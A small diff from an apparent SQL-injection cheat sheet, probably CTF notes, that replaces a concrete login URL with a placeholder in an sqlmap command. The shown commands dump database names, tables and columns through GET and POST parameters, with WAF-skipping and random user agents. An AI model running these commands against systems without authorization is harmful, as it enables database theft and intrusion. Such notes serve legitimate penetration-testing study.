@@ -35,7 +35,7 @@ sqlmap -u "url?prm=" -p prm -D dbname -T table_name -C column_name --dump --meth
 ```
  For POST Request
 ```
-sqlmap -u "http://35.227.24.107/ab6ad62d13/login" --data "username=a&password=b&xyz=c" -p "username,password" --method POST --skip-waf --random-agent --threads 10 -o --dbs --dump
+sqlmap -u "url/login" --data "username=a&password=b&xyz=c" -p "username,password" --method POST --skip-waf --random-agent --threads 10 -o --dbs --dump
 
 ```
 
